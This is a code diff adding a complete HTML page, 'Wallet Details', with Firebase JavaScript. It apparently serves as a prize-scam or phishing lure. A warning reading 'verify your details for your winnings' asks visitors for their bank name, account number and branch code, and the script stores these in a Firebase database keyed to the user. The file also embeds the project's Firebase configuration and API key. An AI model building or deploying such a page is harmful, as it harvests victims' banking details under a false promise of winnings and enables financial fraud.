@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Wallet Details</title>
+
+<style>
+body{
+  margin:0;
+  background:#001f3f;
+  font-family:Arial;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+#box{
+  width:90%;
+}
+
+input{
+  width:100%;
+  padding:18px;
+  margin:10px 0;
+  font-size:18px;
+  background:#fffdd0; /* cream */
+  border:none;
+}
+
+button{
+  width:100%;
+  padding:18px;
+  font-size:20px;
+  background:green;
+  color:white;
+  border:none;
+}
+
+#warn{
+  color:red;
+  text-align:center;
+  margin-top:10px;
+}
+
+#popup{
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  background:white;
+  padding:30px;
+  font-size:24px;
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div id="box">
+  <input id="bank" placeholder="BANK NAME">
+  <input id="account" placeholder="ACCOUNT NUMBER">
+  <input id="branch" placeholder="BRANCH CODE">
+
+  <button onclick="submit()">SUBMIT</button>
+
+  <div id="warn">verify your details for your winnings</div>
+</div>
+
+<div id="popup">SUBMITTED</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBqJTLjxhZBCsvjrTH_cG0fkXlElG6BqTg",
+  authDomain: "tose-ccf8f.firebaseapp.com",
+  databaseURL: "https://tose-ccf8f-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "tose-ccf8f",
+  storageBucket: "tose-ccf8f.appspot.com",
+  messagingSenderId: "475447495901",
+  appId: "1:475447495901:web:9189276a162a3680afdf34"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const auth = getAuth(app);
+
+let user;
+
+onAuthStateChanged(auth,(u)=>{
+  if(!u) location.href="index.html";
+  user=u;
+});
+
+window.submit = async ()=>{
+  const bank = bankInput.value;
+  const account = accountInput.value;
+  const branch = branchInput.value;
+
+  if(!bank || !account || !branch){
+    alert("Fill all fields");
+    return;
+  }
+
+  await set(ref(db,"walletDetails/"+user.uid),{
+    uid:user.uid,
+    bank,
+    account,
+    branch,
+    timestamp:Date.now()
+  });
+
+  document.getElementById("popup").style.display="block";
+};
+
+const bankInput=document.getElementById("bank");
+const accountInput=document.getElementById("account");
+const branchInput=document.getElementById("branch");
+
+</script>
+
+</body>
+     </html>
